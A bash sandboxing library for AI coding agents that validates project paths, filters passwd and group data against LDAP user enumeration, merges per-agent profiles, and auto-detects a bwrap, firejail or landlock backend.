if [[ -z "${SANDBOX_BYPASS_TOKEN:-}" && -n "${TOKEN_FILE:-}" ]]; then
    SANDBOX_BYPASS_TOKEN="$TOKEN_FILE"
fi

# ── Helpers ─────────────────────────────────────────────────────

validate_project_dir() {
    local dir="$1"
    for parent in "${ALLOWED_PROJECT_PARENTS[@]}"; do
        parent="${parent/\$HOME/$HOME}"
        parent="${parent%/}"  # strip trailing slash
        # Exact match or proper subdirectory (with / boundary).
        # Without the boundary check, parent=/home/alice would
        # incorrectly match dir=/home/alicebob/project.
        if [[ "$dir" == "$parent" || "$dir" == "$parent/"* ]]; then
            return 0
        fi
    done
    echo "Error: Project directory not under an allowed parent path." >&2
    echo "  Got: $dir" >&2
    echo "  Allowed prefixes: ${ALLOWED_PROJECT_PARENTS[*]}" >&2
    echo "  Edit ALLOWED_PROJECT_PARENTS in $SANDBOX_CONF to allow more." >&2
    return 1
}

# ── Passwd filtering (LDAP/AD user enumeration prevention) ────────
#
# Generates a minimal /etc/passwd and /etc/nsswitch.conf for use inside
# the sandbox.  The filtered passwd contains only system accounts
# (UID < 1000) and the current user.  The filtered nsswitch.conf
# replaces "ldap", "sss", and "compat" with "files" for the passwd
# and group databases, so getent only returns local entries.
#
# Sets _FILTERED_PASSWD and _FILTERED_NSSWITCH to the generated paths.
# Backends that support file overlays (bwrap) use these directly.

generate_filtered_passwd() {
    _is_true "${FILTER_PASSWD:-true}" || return 0

    local tmpdir="$_USER_DATA_DIR/.passwd-filter"
    mkdir -p "$tmpdir"

    local my_uid
    my_uid="$(id -u)"

    # Minimal passwd: system accounts (UID < 1000) from the local file.
    # Does NOT use getent for the base set (that would pull all LDAP users).
    awk -F: '($3 < 1000)' /etc/passwd > "$tmpdir/passwd"

    # Append specific users via getent (handles both local and LDAP).
    # Current user + service users needed by tools inside the sandbox.
    for _svc_user in "$(id -un)" slurm munge nobody; do
        if ! grep -q "^${_svc_user}:" "$tmpdir/passwd"; then
            getent passwd "$_svc_user" >> "$tmpdir/passwd" 2>/dev/null || true
        fi
    done

    # Minimal group: system groups (GID < 1000) from the local file.
    awk -F: '($3 < 1000)' /etc/group > "$tmpdir/group"

    # Append current user's groups, service groups, and well-known groups
    # by name (nogroup/nfsnobody may appear via NFS even when not in id -G).
    for _svc_group in nogroup nfsnobody; do
        if ! grep -q "^${_svc_group}:" "$tmpdir/group"; then
            getent group "$_svc_group" >> "$tmpdir/group" 2>/dev/null || true
        fi
    done
    # Add all of the current user's groups (by GID and by name as fallback).
    # This ensures `id` inside the sandbox shows the correct group names,
    # even though supplementary groups are always preserved at the kernel level
    # (bwrap does not use --unshare-user, so file permissions work regardless).
    for _svc_gid in $(id -G) $(getent passwd slurm 2>/dev/null | cut -d: -f4) $(getent passwd munge 2>/dev/null | cut -d: -f4); do
        if ! grep -q "^[^:]*:[^:]*:${_svc_gid}:" "$tmpdir/group"; then
            getent group "$_svc_gid" >> "$tmpdir/group" 2>/dev/null || true
        fi
    done
    # Fallback: also try by name (some LDAP setups resolve names but not GIDs)
    for _svc_gname in $(id -Gn 2>/dev/null); do
        if ! grep -q "^${_svc_gname}:" "$tmpdir/group"; then
            getent group "$_svc_gname" >> "$tmpdir/group" 2>/dev/null || true
        fi
    done

    # nsswitch.conf: replace ldap/sss/compat with files-only for passwd/group
    if [[ -f /etc/nsswitch.conf ]]; then
        sed -E \
            -e 's/^(passwd|group):.*$/\1:         files/' \
            /etc/nsswitch.conf > "$tmpdir/nsswitch.conf"
    else
        printf 'passwd:         files\ngroup:          files\nhosts:          files dns\n' \
            > "$tmpdir/nsswitch.conf"
    fi

    _FILTERED_PASSWD="$tmpdir/passwd"
    _FILTERED_GROUP="$tmpdir/group"
    _FILTERED_NSSWITCH="$tmpdir/nsswitch.conf"
}

# ── Agent detection and profile system ─────────────────────────────
#
# Scans agents/*/detect.sh to find installed agents, then merges their
# home.conf, hide.conf, and env.conf into the global sandbox arrays.
# Each agent's overlay.sh handles config file merging (e.g., CLAUDE.md).
#
# Data flow:
#   _detect_agents()         — find which agents are installed
#   _apply_agent_profiles()  — merge home/hide/env configs, create stub dirs
#   prepare_agent_configs()  — run each agent's overlay.sh for config merging

# Detected agent names (populated by _detect_agents)
_DETECTED_AGENTS=()

# Environment exports collected from agent overlays
_AGENT_ENV_EXPORTS=()
# Sandbox-config directories to bind-mount (writable) inside the sandbox
_AGENT_SANDBOX_CONFIG_DIRS=()
# Individual files within config dirs to protect via ro-bind
_AGENT_PROTECTED_FILES=()

# _detect_agents — scan agents/*/detect.sh, populate _DETECTED_AGENTS
_detect_agents() {
    _DETECTED_AGENTS=()
    local agents_dir="$SANDBOX_DIR/agents"
    [[ -d "$agents_dir" ]] || return 0

    for detect_script in "$agents_dir"/*/detect.sh; do
        [[ -f "$detect_script" ]] || continue
        local agent_name
        agent_name="$(basename "$(dirname "$detect_script")")"

        # Source detect.sh in a subshell to isolate side effects.
        # Timeout prevents a broken/malicious detect.sh from stalling startup.
        if timeout 2 bash -c "source '$detect_script' && agent_detect" 2>/dev/null; then
            _DETECTED_AGENTS+=("$agent_name")
        fi
    done

    if [[ ${#_DETECTED_AGENTS[@]} -gt 0 ]]; then
        echo "sandbox: detected agents: ${_DETECTED_AGENTS[*]}" >&2
    fi
}

# _apply_agent_profiles — merge home.conf, hide.conf, env.conf into globals
_apply_agent_profiles() {
    local agents_dir="$SANDBOX_DIR/agents"

    for agent_name in "${_DETECTED_AGENTS[@]}"; do
        local profile_dir="$agents_dir/$agent_name"

        # --- home.conf: add writable/readonly paths ---
        if [[ -f "$profile_dir/home.conf" ]]; then
            local AGENT_HOME_WRITABLE=()
            local AGENT_HOME_READONLY=()
            # shellcheck disable=SC1090
            source "$profile_dir/home.conf"

            for _path in "${AGENT_HOME_WRITABLE[@]}"; do
                # Avoid duplicates
                local _dup=false
                for _existing in "${HOME_WRITABLE[@]}"; do
                    [[ "$_existing" == "$_path" ]] && { _dup=true; break; }
                done
                $_dup || HOME_WRITABLE+=("$_path")
            done

            for _path in "${AGENT_HOME_READONLY[@]}"; do
                local _dup=false
                for _existing in "${HOME_READONLY[@]}"; do
                    [[ "$_existing" == "$_path" ]] && { _dup=true; break; }
                done
                $_dup || HOME_READONLY+=("$_path")
            done
        fi

        # --- hide.conf: add files to BLOCKED_FILES ---
        if [[ -f "$profile_dir/hide.conf" ]]; then
            local AGENT_HIDE_FILES=()
            # shellcheck disable=SC1090
            source "$profile_dir/hide.conf"

            for _file in "${AGENT_HIDE_FILES[@]}"; do
                # Expand $HOME in the path
                _file="${_file/\$HOME/$HOME}"
                local _dup=false
                for _existing in "${BLOCKED_FILES[@]}"; do
                    [[ "$_existing" == "$_file" ]] && { _dup=true; break; }
                done
                $_dup || BLOCKED_FILES+=("$_file")
            done
        fi

        # --- env.conf: remove vars from BLOCKED_ENV_VARS ---
        if [[ -f "$profile_dir/env.conf" ]]; then
            local AGENT_UNBLOCK_ENV_VARS=()
            # shellcheck disable=SC1090
            source "$profile_dir/env.conf"

            if [[ ${#AGENT_UNBLOCK_ENV_VARS[@]} -gt 0 ]]; then
                local _new_blocked=()
                for _var in "${BLOCKED_ENV_VARS[@]}"; do
                    local _unblock=false
                    for _unblock_var in "${AGENT_UNBLOCK_ENV_VARS[@]}"; do
                        [[ "$_var" == "$_unblock_var" ]] && { _unblock=true; break; }
                    done
                    $_unblock || _new_blocked+=("$_var")
                done
                BLOCKED_ENV_VARS=("${_new_blocked[@]}")
            fi
        fi

        # NOTE: We intentionally do NOT create stub directories for
        # first-time usage. Creating dirs like ~/.config/opencode/ would
        # cause the agent to be "detected" on subsequent runs even if
        # it's not installed, which triggers env var unblocking from its
        # env.conf (a security issue). The backends handle non-existent
        # HOME_WRITABLE paths gracefully (they're skipped).
    done
}

# prepare_agent_configs PROJECT_DIR — run each agent's overlay.sh
prepare_agent_configs() {
    local project_dir="$1"
    local agents_dir="$SANDBOX_DIR/agents"
    _AGENT_ENV_EXPORTS=()
    _AGENT_SANDBOX_CONFIG_DIRS=()
    _AGENT_PROTECTED_FILES=()

    for agent_name in "${_DETECTED_AGENTS[@]}"; do
        local overlay="$agents_dir/$agent_name/overlay.sh"
        if [[ -f "$overlay" ]]; then
            # Source overlay in current shell (needs access to globals)
            # shellcheck disable=SC1090
            source "$overlay"
            agent_prepare_config "$project_dir"
        fi
    done
}

# ── Backend detection ───────────────────────────────────────────

# SANDBOX_BACKEND can be set in sandbox.conf or environment.
# Values: auto (picks best available), bwrap, firejail, landlock
SANDBOX_BACKEND="${SANDBOX_BACKEND:-auto}"

detect_backend() {
    if [[ "$SANDBOX_BACKEND" != "auto" ]]; then
        # User explicitly requested a backend
        if [[ ! -f "$SANDBOX_DIR/backends/${SANDBOX_BACKEND}.sh" ]]; then
            echo "Error: Unknown backend '$SANDBOX_BACKEND'" >&2
            echo "  Available: bwrap, firejail, landlock" >&2
            exit 1
        fi
        # shellcheck disable=SC1090
        source "$SANDBOX_DIR/backends/${SANDBOX_BACKEND}.sh"
        if ! backend_available; then
            echo "Error: Requested backend '$SANDBOX_BACKEND' is not available on this system." >&2
            echo "  Host:   $(hostname 2>/dev/null || echo unknown)" >&2
            echo "  Kernel: $(uname -r 2>/dev/null || echo unknown)" >&2
            echo "  LSMs:   $(cat /sys/kernel/security/lsm 2>/dev/null || echo unknown)" >&2
            exit 1
        fi
        return
    fi

    # Auto-detect: try bwrap first (mount namespace), then firejail (setuid),
    # then landlock (LSM — weakest isolation but works everywhere ≥ 5.13)
    # shellcheck disable=SC1090
    source "$SANDBOX_DIR/backends/bwrap.sh"
    if backend_available; then
        SANDBOX_BACKEND=bwrap
        return
    fi

    # shellcheck disable=SC1090
    source "$SANDBOX_DIR/backends/firejail.sh"
    if backend_available; then
        SANDBOX_BACKEND=firejail
        return
    fi

    # shellcheck disable=SC1090
    source "$SANDBOX_DIR/backends/landlock.sh"
    if backend_available; then
        SANDBOX_BACKEND=landlock
        return
    fi

    # Collect diagnostics for troubleshooting
    local _host _kernel _os _userns _lsm _bwrap_path _firejail_path
    _host="$(hostname 2>/dev/null || echo unknown)"
    _kernel="$(uname -r 2>/dev/null || echo unknown)"
    _os="$(. /etc/os-release 2>/dev/null && echo "$PRETTY_NAME" || echo unknown)"
    _bwrap_path="$(command -v bwrap 2>/dev/null || echo "not found")"
    _firejail_path="$(command -v firejail 2>/dev/null || echo "not found")"
    _userns="$(cat /proc/sys/user/max_user_namespaces 2>/dev/null || echo "unknown")"
    _lsm="$(cat /sys/kernel/security/lsm 2>/dev/null || echo "unknown")"

    echo "Error: No sandbox backend available." >&2
    echo "" >&2
    echo "  Host:       $_host" >&2
    echo "  OS:         $_os" >&2
    echo "  Kernel:     $_kernel" >&2
    echo "  LSMs:       $_lsm" >&2
    echo "  bwrap:      $_bwrap_path" >&2
    echo "  firejail:   $_firejail_path" >&2
    echo "  userns max: $_userns" >&2
    echo "" >&2
    echo "  Tried:" >&2
    echo "    bwrap    — $(if [[ "$_bwrap_path" == "not found" ]]; then echo "binary not found"; elif echo "$_lsm" | grep -q apparmor && sysctl -n kernel.apparmor_restrict_unprivileged_userns 2>/dev/null | grep -q 1; then echo "blocked by AppArmor userns restriction"; else echo "failed (check user namespace support)"; fi)" >&2
    echo "    firejail — $(if [[ "$_firejail_path" == "not found" ]]; then echo "binary not found"; else echo "failed (check setuid bit or seccomp support)"; fi)" >&2
    echo "    landlock — $(
        local _kmaj _kmin
        _kmaj="$(uname -r | cut -d. -f1)"
        _kmin="$(uname -r | cut -d. -f2)"
        if [[ "$_kmaj" -lt 5 ]] 2>/dev/null || { [[ "$_kmaj" -eq 5 ]] && [[ "$_kmin" -lt 13 ]]; } 2>/dev/null; then
            echo "kernel too old (need ≥ 5.13)"
        elif ! echo "$_lsm" | grep -q landlock; then
            echo "not in active LSM list"
        else
            echo "failed (check CONFIG_SECURITY_LANDLOCK)"
        fi
    )" >&2
    echo "" >&2
    echo "  Fix:" >&2
    echo "    Install bubblewrap:  brew install bubblewrap" >&2
    echo "    Install firejail:    sudo apt install firejail" >&2
    echo "    Or ensure kernel ≥ 5.13 with Landlock enabled." >&2
    exit 1
}

# ── Legacy compatibility ────────────────────────────────────────
# These functions are kept so that existing code that sources sandbox-lib.sh
# and calls build_bwrap_args() directly (e.g., srun-sandbox.sh) still works.
# New code should use detect_backend + backend_prepare + backend_exec.

# Detect on source if not already done (for scripts that source sandbox-lib.sh
# and immediately call build_bwrap_args).
_BACKEND_DETECTED=false

build_bwrap_args() {
    if [[ "$_BACKEND_DETECTED" == false ]]; then
        detect_backend
        _BACKEND_DETECTED=true
    fi
    _detect_agents
    _apply_agent_profiles
    prepare_agent_configs "$1"
    backend_prepare "$1"
}

# Expose BWRAP for legacy callers (resolved by bwrap backend)
# This is a no-op if landlock backend is loaded.
